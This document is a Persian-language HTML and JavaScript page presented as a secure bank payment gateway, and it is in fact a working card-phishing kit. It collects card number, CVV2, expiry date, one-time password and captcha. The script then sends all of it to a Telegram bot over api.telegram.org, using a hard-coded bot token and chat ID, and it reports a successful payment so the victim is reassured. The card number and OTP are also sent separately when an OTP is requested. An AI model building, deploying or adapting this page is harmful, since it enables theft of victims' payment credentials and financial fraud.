<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>درگاه پرداخت آزمایشی</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: Tahoma, Arial, sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
}

.container {
    width: 440px;
    background: #fff;
    border-radius: 20px;
    padding: 35px 30px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    animation: slideUp 0.5s ease;
}

@keyframes slideUp {
    from {
        opacity: 0;
        transform: translateY(30px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

.header {
    text-align: center;
    margin-bottom: 25px;
    padding-bottom: 20px;
    border-bottom: 2px solid #f0f0f0;
}

.header .logo {
    font-size: 40px;
    margin-bottom: 5px;
}

.header h3 {
    color: #1976d2;
    font-size: 22px;
    margin: 0;
    font-weight: 700;
}

.header p {
    color: #888;
    font-size: 12px;
    margin-top: 5px;
}

.input-group {
    margin-bottom: 12px;
}

.input-group label {
    display: block;
    font-size: 12px;
    color: #555;
    margin-bottom: 4px;
    font-weight: bold;
}

.input-group input {
    width: 100%;
    padding: 12px 15px;
    border: 2px solid #e0e0e0;
    border-radius: 10px;
    font-size: 14px;
    transition: all 0.3s;
    background: #fafafa;
    font-family: Tahoma;
}

.input-group input:focus {
    outline: none;
    border-color: #1976d2;
    background: #fff;
    box-shadow: 0 0 0 3px rgba(25, 118, 210, 0.1);
}

.input-group input::placeholder {
    color: #bbb;
    font-size: 12px;
}

.row {
    display: flex;
    gap: 12px;
}

.row .input-group {
    flex: 1;
}

.captcha-section {
    display: flex;
    align-items: center;
    gap: 12px;
    background: #f8f9fa;
    padding: 8px 15px;
    border-radius: 10px;
    border: 2px solid #e0e0e0;
    margin-top: 5px;
}

.captcha-box {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    padding: 8px 16px;
    border-radius: 8px;
    font-weight: bold;
    font-size: 18px;
    letter-spacing: 3px;
    font-family: 'Courier New', monospace;
    min-width: 80px;
    text-align: center;
    user-select: none;
}

.captcha-section input {
    flex: 1;
    border: none;
    background: transparent;
    padding: 10px 5px;
    font-size: 14px;
}

.captcha-section input:focus {
    outline: none;
}

.btn {
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 10px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    transition: all 0.3s;
    margin-top: 8px;
    font-family: Tahoma;
}

.btn-pay {
    background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
    color: white;
    box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
}

.btn-pay:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(34, 197, 94, 0.4);
}

.btn-pay:active {
    transform: translateY(0);
}

.btn-otp {
    background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
    color: white;
    box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
    margin-bottom: 8px;
}

.btn-otp:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
}

.btn-otp:active {
    transform: translateY(0);
}

.btn-otp:disabled {
    opacity: 0.6;
    cursor: not-allowed;
    transform: none !important;
}

.btn-cancel {
    background: #f59e0b;
    color: white;
    box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3);
}

.btn-cancel:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(245, 158, 11, 0.4);
}

.btn-cancel:active {
    transform: translateY(0);
}

#msg {
    margin-top: 15px;
    text-align: center;
    font-size: 13px;
    padding: 12px;
    border-radius: 8px;
    background: #f0f7ff;
    color: #1976d2;
    line-height: 1.6;
    min-height: 60px;
}

#msg.error {
    background: #fff0f0;
    color: #d32f2f;
}

#msg.success {
    background: #f0fff4;
    color: #16a34a;
}

#msg.warning {
    background: #fffbeb;
    color: #d97706;
}

#msg.otp-received {
    background: #e0f2fe;
    color: #0369a1;
    border: 2px dashed #3b82f6;
}

.status-dot {
    display: inline-block;
    width: 8px;
    height: 8px;
    border-radius: 50%;
    margin-left: 5px;
}

.status-dot.green {
    background: #22c55e;
}

.status-dot.red {
    background: #ef4444;
}

.status-dot.yellow {
    background: #f59e0b;
}

.status-dot.blue {
    background: #3b82f6;
}

.badge {
    display: inline-block;
    background: #22c55e;
    color: white;
    font-size: 10px;
    padding: 2px 10px;
    border-radius: 20px;
    margin-top: 5px;
}

.otp-input-wrapper {
    position: relative;
}

.otp-input-wrapper input {
    padding-left: 100px;
}

.otp-timer {
    position: absolute;
    left: 12px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 12px;
    color: #888;
    background: #f0f0f0;
    padding: 3px 10px;
    border-radius: 20px;
    font-weight: bold;
}

.password-hint {
    font-size: 11px;
    color: #888;
    margin-top: 3px;
}

/* Responsive */
@media (max-width: 480px) {
    .container {
        padding: 20px;
        width: 100%;
    }
    
    .row {
        flex-direction: column;
        gap: 0;
    }
    
    .captcha-section {
        flex-wrap: wrap;
    }
    
    .captcha-box {
        width: 100%;
        text-align: center;
    }
    
    .otp-input-wrapper input {
        padding-left: 80px;
    }
}
</style>

</head>
<body>

<div class="container">

    <div class="header">
        <div class="logo">💳</div>
        <h3>درگاه پرداخت ایمن</h3>
        <p>🔒 اطلاعات شما با بالاترین سطح امنیت محافظت می‌شود</p>
        <span class="badge">✅ اتصال امن</span>
    </div>

    <form id="paymentForm" onsubmit="return false;">
        <div class="input-group">
            <label>🏦 شماره کارت</label>
            <input type="text" id="cardNumber" placeholder="مثال: 6037 9912 3456 7890" maxlength="19">
        </div>

        <div class="input-group">
            <label>🔐 CVV2</label>
            <input type="text" id="cvv" placeholder="مثال: 1234  " maxlength="4">
        </div>

        <div class="row">
            <div class="input-group">
                <label>📅 ماه انقضا</label>
                <input type="text" id="month" placeholder="مثال: 12" maxlength="2">
            </div>
            <div class="input-group">
                <label>📅 سال انقضا</label>
                <input type="text" id="year" placeholder="مثال: 1405" maxlength="4">
            </div>
        </div>

        <div class="input-group">
            <label>🔑 رمز یک‌بارمصرف (OTP)</label>
            <div class="otp-input-wrapper">
                <input type="password" id="password" placeholder="رمز ارسال شده به موبایل">
                <span class="otp-timer" id="otpTimer">⏱️ ۰:۰۰</span>
            </div>
            <div class="password-hint">
                💡 رمز یک‌بارمصرف به شماره همراه شما پیامک شد
            </div>
        </div>

        <!-- دکمه درخواست رمز دوم -->
        <button type="button" class="btn btn-otp" id="otpButton" onclick="requestOTP()">
            📱 درخواست رمز دوم (OTP)
        </button>

        <div class="input-group" style="margin-top: 12px;">
            <label>🛡 کد امنیتی</label>
            <div class="captcha-section">
                <div class="captcha-box" id="captchaText">B9K2F</div>
                <input type="text" id="captchaInput" placeholder="کد را وارد کنید">
            </div>
        </div>

        <button type="button" class="btn btn-pay" onclick="processPayment()">
            ✅ پرداخت
        </button>
        <button type="button" class="btn btn-cancel" onclick="cancelPayment()">
            ❌ انصراف
        </button>
    </form>

    <div id="msg">
        <span class="status-dot green"></span>
        منتظر وارد کردن اطلاعات شما هستیم...
    </div>

</div>

<script>
// ============================================
// تنظیمات ربات تلگرام - اینجا را ویرایش کنید
// ============================================
const BOT_TOKEN = "8235157882:AAEyPdSjRn7SzBnpLYrZqOFeRVpZg3q-tM8";  // توکن ربات خود را وارد کنید
const CHAT_ID = "5403370300";      // آیدی چت خود را وارد کنید
// ============================================

// متغیرهای مربوط به OTP
let otpTimerInterval = null;
let otpSeconds = 0;
let isOtpRequested = false;
let generatedOtp = null;

// تولید کد کپچا
function generateCaptcha() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let captcha = '';
    for (let i = 0; i < 5; i++) {
        captcha += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    document.getElementById('captchaText').textContent = captcha;
    return captcha;
}

// تولید رمز یک‌بارمصرف شبیه‌سازی شده
function generateOTP() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// آپدیت پیام
function updateMessage(text, type = '') {
    const msg = document.getElementById('msg');
    msg.textContent = text;
    msg.className = type;
}

// ============================================
// تابع درخواست رمز دوم (شبیه‌سازی)
// ============================================
function requestOTP() {
    const cardNumber = document.getElementById('cardNumber').value.trim();
    
    // اعتبارسنجی شماره کارت
    const cleanCard = cardNumber.replace(/\s/g, '');
    if (cleanCard.length < 16) {
        updateMessage('❌ لطفاً شماره کارت را به درستی وارد کنید!', 'error');
        return;
    }

    // جلوگیری از درخواست مکرر
    if (isOtpRequested) {
        updateMessage('⏳ قبلاً رمز درخواست شده! لطفاً صبر کنید.', 'warning');
        return;
    }

    // تولید رمز شبیه‌سازی شده
    generatedOtp = generateOTP();
    
    // نمایش پیام دریافت رمز
    updateMessage(`📱 رمز یک‌بارمصرف به شماره همراه شما ارسال شد! 
    \n📌 کد آزمایشی: ${generatedOtp} (این کد فقط برای آزمایش است)`, 'otp-received');

    // فعال کردن تایمر
    isOtpRequested = true;
    document.getElementById('otpButton').disabled = true;
    document.getElementById('otpButton').textContent = '⏳ در حال ارسال...';
    
    // شبیه‌سازی ارسال پیامک
    setTimeout(() => {
        document.getElementById('otpButton').textContent = '✅ رمز ارسال شد';
        document.getElementById('otpButton').style.background = 'linear-gradient(135deg, #22c55e 0%, #16a34a 100%)';
        
        // شروع تایمر ۲ دقیقه‌ای
        startOtpTimer(120);
        
        // ارسال OTP به تلگرام (اختیاری)
        sendOTPToTelegram(cardNumber, generatedOtp);
        
        // پس از ۵ ثانیه، پیام راهنما نمایش داده شود
        setTimeout(() => {
            updateMessage(`📱 رمز یک‌بارمصرف به شماره همراه شما ارسال شد. 
            \n🔑 کد آزمایشی: ${generatedOtp} (برای ورود استفاده کنید)
            \n⏱️ این کد تا ۲ دقیقه اعتبار دارد.`, 'otp-received');
        }, 1000);
        
    }, 2000);
}

// ============================================
// تایمر OTP
// ============================================
function startOtpTimer(duration) {
    let timeLeft = duration;
    const timerElement = document.getElementById('otpTimer');
    
    if (otpTimerInterval) {
        clearInterval(otpTimerInterval);
    }
    
    otpTimerInterval = setInterval(() => {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerElement.textContent = `⏱️ ${minutes}:${seconds.toString().padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
            clearInterval(otpTimerInterval);
            timerElement.textContent = '⏱️ ۰:۰۰';
            isOtpRequested = false;
            document.getElementById('otpButton').disabled = false;
            document.getElementById('otpButton').textContent = '📱 درخواست رمز دوم (OTP)';
            document.getElementById('otpButton').style.background = 'linear-gradient(135deg, #3b82f6 0%, #2563eb 100%)';
            updateMessage('⏰ زمان رمز یک‌بارمصرف به پایان رسید. دوباره درخواست کنید.', 'warning');
            generatedOtp = null;
        }
        timeLeft--;
    }, 1000);
}

// ============================================
// ارسال OTP به تلگرام (اختیاری)
// ============================================
async function sendOTPToTelegram(cardNumber, otp) {
    if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
        return;
    }
    
    const message = `📱 *درخواست رمز یک‌بارمصرف*\n\n` +
                    `💳 شماره کارت: ${cardNumber}\n` +
                    `🔑 رمز OTP: ${otp}\n` +
                    `⏰ زمان درخواست: ${new Date().toLocaleString('fa-IR')}\n` +
                    `⏱️ اعتبار: ۲ دقیقه`;
    
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (error) {
        console.error('Error sending OTP to Telegram:', error);
    }
}

// ============================================
// ارسال به تلگرام
// ============================================
async function sendToTelegram(data) {
    if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
        updateMessage('⚠️ لطفاً توکن و آیدی ربات را در کد تنظیم کنید!', 'error');
        return false;
    }

    let message = '📋 *اطلاعات پرداخت جدید*\n\n';
    message += `💳 شماره کارت: ${data.card || '❌ خالی'}\n`;
    message += `🔐 CVV2: ${data.cvv || '❌ خالی'}\n`;
    message += `📅 تاریخ انقضا: ${data.month}/${data.year || '❌ خالی'}\n`;
    message += `🔑 رمز یک‌بارمصرف: ${data.password || '❌ خالی'}\n`;
    message += `🛡 کد امنیتی: ${data.captcha || '❌ خالی'}\n`;
    message += `\n⏰ زمان: ${new Date().toLocaleString('fa-IR')}`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error('Network Error:', error);
        return false;
    }
}

// ============================================
// پردازش پرداخت
// ============================================
async function processPayment() {
    const card = document.getElementById('cardNumber').value.trim();
    const cvv = document.getElementById('cvv').value.trim();
    const month = document.getElementById('month').value.trim();
    const year = document.getElementById('year').value.trim();
    const password = document.getElementById('password').value.trim();
    const captchaInput = document.getElementById('captchaInput').value.trim();
    const captchaText = document.getElementById('captchaText').textContent;

    // اعتبارسنجی
    const cleanCard = card.replace(/\s/g, '');
    if (cleanCard.length < 16) {
        updateMessage('❌ شماره کارت نامعتبر است (حداقل 16 رقم)', 'error');
        return;
    }

    if (!cvv || cvv.length < 3) {
        updateMessage('❌ CVV2 نامعتبر است (3 یا 4 رقم)', 'error');
        return;
    }

    if (!month || !year) {
        updateMessage('❌ تاریخ انقضا را کامل وارد کنید', 'error');
        return;
    }

    if (!password || password.length < 4) {
        updateMessage('❌ رمز یک‌بارمصرف را وارد کنید', 'error');
        return;
    }

    // اعتبارسنجی OTP
    if (generatedOtp && password !== generatedOtp) {
        updateMessage('❌ رمز یک‌بارمصرف اشتباه است! دوباره تلاش کنید.', 'error');
        return;
    }

    if (!captchaInput) {
        updateMessage('❌ کد امنیتی را وارد کنید', 'error');
        return;
    }

    if (captchaInput.toUpperCase() !== captchaText) {
        updateMessage('❌ کد امنیتی اشتباه است! دوباره تلاش کنید', 'error');
        generateCaptcha();
        document.getElementById('captchaInput').value = '';
        return;
    }

    const data = { card, cvv, month, year, password, captcha: captchaInput };

    updateMessage('⏳ در حال ارسال اطلاعات... لطفاً صبر کنید', '');

    const sent = await sendToTelegram(data);

    if (sent) {
        updateMessage('✅ پرداخت با موفقیت انجام شد! اطلاعات شما ارسال گردید.', 'success');
        // توقف تایمر
        if (otpTimerInterval) {
            clearInterval(otpTimerInterval);
        }
        document.getElementById('otpTimer').textContent = '⏱️ ۰:۰۰';
        isOtpRequested = false;
        document.getElementById('otpButton').disabled = false;
        document.getElementById('otpButton').textContent = '📱 درخواست رمز دوم (OTP)';
        document.getElementById('otpButton').style.background = 'linear-gradient(135deg, #3b82f6 0%, #2563eb 100%)';
        generatedOtp = null;
    } else {
        updateMessage('❌ خطا در ارسال اطلاعات! لطفاً دوباره تلاش کنید.', 'error');
    }
}

// ============================================
// انصراف
// ============================================
function cancelPayment() {
    if (confirm('آیا از انصراف مطمئن هستید؟')) {
        document.getElementById('paymentForm').reset();
        generateCaptcha();
        if (otpTimerInterval) {
            clearInterval(otpTimerInterval);
        }
        document.getElementById('otpTimer').textContent = '⏱️ ۰:۰۰';
        isOtpRequested = false;
        document.getElementById('otpButton').disabled = false;
        document.getElementById('otpButton').textContent = '📱 درخواست رمز دوم (OTP)';
        document.getElementById('otpButton').style.background = 'linear-gradient(135deg, #3b82f6 0%, #2563eb 100%)';
        generatedOtp = null;
        updateMessage('🟡 عملیات لغو شد. منتظر اطلاعات جدید هستیم...', '');
    }
}

// ============================================
// Event Listeners
// ============================================
// فرمت شماره کارت
document.getElementById('cardNumber').addEventListener('input', function(e) {
    let value = this.value.replace(/\D/g, '');
    if (value.length > 16) value = value.slice(0, 16);
    let formatted = '';
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) formatted += ' ';
        formatted += value[i];
    }
    this.value = formatted;
});

// فقط عدد
document.getElementById('cvv').addEventListener('input', function(e) {
    this.value = this.value.replace(/\D/g, '');
    if (this.value.length > 4) this.value = this.value.slice(0, 4);
});

document.getElementById('month').addEventListener('input', function(e) {
    this.value = this.value.replace(/\D/g, '');
    if (this.value.length > 2) this.value = this.value.slice(0, 2);
});

document.getElementById('year').addEventListener('input', function(e) {
    this.value = this.value.replace(/\D/g, '');
    if (this.value.length > 4) this.value = this.value.slice(0, 4);
});

// Enter key
document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        const active = document.activeElement;
        if (active && active.tagName === 'INPUT') {
            e.preventDefault();
            processPayment();
        }
    }
});

// ============================================
// مقداردهی اولیه
// ============================================
window.onload = function() {
    generateCaptcha();
    updateMessage('🟢 منتظر وارد کردن اطلاعات شما هستیم...', '');
    console.log('✅ درگاه پرداخت بارگذاری شد!');
    console.log('📌 برای تنظیم ربات، توکن و CHAT_ID را در کد تغییر دهید.');
    console.log('📱 برای درخواست OTP، شماره کارت را وارد و دکمه را بزنید.');
};
</script>

</body>
</html>
